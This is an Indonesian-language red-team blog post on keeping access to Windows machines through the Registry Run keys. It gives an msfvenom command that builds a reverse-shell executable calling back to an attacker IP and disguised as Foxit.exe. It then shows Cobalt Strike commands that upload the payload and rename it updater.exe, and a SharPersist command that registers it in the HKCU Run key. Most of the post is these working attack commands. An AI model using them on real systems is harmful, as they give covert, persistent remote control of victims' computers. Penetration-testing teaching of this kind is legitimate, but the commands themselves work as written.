---
title: 'Persistence via Registry AutoRun'
date: 2023-07-26 09:42:22 +0700
categories: ['Windows Hacking', 'Windows Persistence']
tags: [red team, persistence, windows hacking, windows persistence, registry]     # TAG names should always be lowercase
author: nairpaa
---

**AutoRun** di HKCU dan HKLM memungkinkan aplikasi untuk berjalan saat *booting*. Umumnya ini digunakan oleh aplikasi seperti *software updaters*, *download assistants*, *driver utilities*, dan sebagainya.

## 0x1 - Exploitation Stages

### Step 1: Create Malware and Upload

```bash
# Contoh buat malware dengan MSF
➜ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.73 LPORT=80 -f exe -o Foxit.exe  
```

```powershell
# Contoh upload file pada Cobalt Strike
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
```

### Step 2: Add Malware to Registry AutoRun

```bash
PS > .\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```

Keterangan:
- `-k`: *Registry key* yang akan dimodifikasi.
- `-v`: Nama *registry key* yang akan dibuat.

![Registry AutoRun](/assets/img/posts/windows-persistence-registry-autorun/1.png)
_Registry AutoRun_

> Sering kali menjadi kesalahpahaman umum bahwa HKLM AutoRun akan menjalankan *payload* sebagai `SYSTEM`, tetapi ini tidaklah benar. 
> 
> Entri AutoRun pada HKCU akan diaktifkan hanya ketika pemilik *hive* (*registry*) tersebut melakukan *login* ke komputer.
> 
> Sedangkan entri AutoRun pada HKLM akan diaktifkan ketika setiap pengguna melakukan login ke komputer. Namun, perlu diingat bahwa meskipun entri tersebut diaktifkan saat pengguna lain *login*, *payload* akan tetap dijalankan di bawah konteks akun pengguna yang terkait, bukan sebagai `SYSTEM`.
{: .prompt-info }


---

## 0x2 - References

- https://github.com/mandiant/SharPersist
- https://azeria-labs.com/persistence/